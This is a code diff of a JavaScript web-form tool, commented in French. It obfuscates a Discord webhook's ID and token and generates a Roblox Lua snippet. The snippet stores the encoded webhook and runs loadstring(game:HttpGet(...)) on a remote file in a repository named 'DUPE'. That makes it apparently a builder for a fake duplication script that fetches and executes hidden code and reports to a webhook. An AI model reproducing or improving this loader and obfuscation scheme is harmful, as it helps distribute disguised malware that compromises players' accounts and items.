@@ -1,37 +1,38 @@
-// Table de substitution pour lettres et chiffres uniquement
-const SUBSTITUTION = {
-  "a":"k","b":"x","c":"m","d":"q","e":"v","f":"z","g":"r","h":"n","i":"y","j":"s",
-  "k":"a","l":"b","m":"c","n":"d","o":"e","p":"f","q":"g","r":"h","s":"i","t":"j",
-  "u":"l","v":"o","w":"p","x":"t","y":"u","z":"w",
-  "A":"K","B":"X","C":"M","D":"Q","E":"V","F":"Z","G":"R","H":"N","I":"Y","J":"S",
-  "K":"A","L":"B","M":"C","N":"D","O":"E","P":"F","Q":"G","R":"H","S":"I","T":"J",
-  "U":"L","V":"O","W":"P","X":"T","Y":"U","Z":"W",
-  "0":"9","1":"8","2":"7","3":"6","4":"5","5":"4","6":"3","7":"2","8":"1","9":"0"
+// Table de substitution pour ID + token
+const CHAR_SUB = {
+  "0":"k","1":"a","2":"h","3":"q","4":"v","5":"z","6":"r","7":"n","8":"y","9":"s",
+  "a":"x","b":"m","c":"d","d":"e","e":"f","f":"g","g":"t","h":"u","i":"l","j":"o",
+  "k":"p","l":"j","m":"c","n":"b","o":"w","p":"i","q":"A","r":"B","s":"C","t":"D",
+  "u":"E","v":"F","w":"G","x":"H","y":"I","z":"J",
+  "A":"K","B":"L","C":"M","D":"N","E":"O","F":"P","G":"Q","H":"R","I":"S","J":"T",
+  "K":"U","L":"V","M":"W","N":"X","O":"Y","P":"Z","Q":"0","R":"1","S":"2","T":"3",
+  "U":"4","V":"5","W":"6","X":"7","Y":"8","Z":"9","_":"_","-":"-"
 };
 
-// Table inverse
-const DECODE = Object.fromEntries(Object.entries(SUBSTITUTION).map(([k,v])=>[v,k]));
-
-// Encode seulement lettres et chiffres, garder symboles intacts
-function encodeWebhook(text){
-  return text.split('').map(c => SUBSTITUTION[c] || c).join('');
+// Encoder uniquement la partie ID + token
+function encodeWebhook(webhook){
+  const prefix = "https://discord.com/api/webhooks/";
+  if(webhook.startsWith(prefix)){
+    const rest = webhook.slice(prefix.length); // ID + token
+    const encodedRest = rest.split('').map(c => CHAR_SUB[c] || c).join('');
+    return "67" + encodedRest;
+  }
+  return webhook;
 }
 
-// Génère Lua avec décodage
-function generateLuaScript(encoded){
-  let luaDecodeTable = Object.entries(SUBSTITUTION)
-    .map(([k,v]) => `["${v}"]="${k}"`)
-    .join(", ");
-  return `getgenv().UserWebhookURL = "${encoded}"
-local REVERSE_SUB = {${luaDecodeTable}}
-local function decode(text)
-  local out = {}
-  for i=1,#text do
-    local c = text:sub(i,i)
-    table.insert(out, REVERSE_SUB[c] or c)
-  end
-  return table.concat(out)
-end
-local webhook = decode(getgenv().UserWebhookURL)
+// Générer Lua minimal
+function generateLuaScript(encodedWebhook){
+  return `getgenv().UserWebhookURL = "${encodedWebhook}"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ZAmbuluda/DUPE/refs/heads/main/settings.md"))()`;
 }
+
+// Formulaire
+document.getElementById('webhookForm').addEventListener('submit', function(e){
+  e.preventDefault();
+  const webhook = document.getElementById('webhook').value;
+  const encoded = encodeWebhook(webhook);
+  const lua = generateLuaScript(encoded);
+  document.getElementById('luaScript').value = lua;
+  document.getElementById('luaScript').style.display = "block";
+  document.getElementById('resultTitle').style.display = "block";
+});
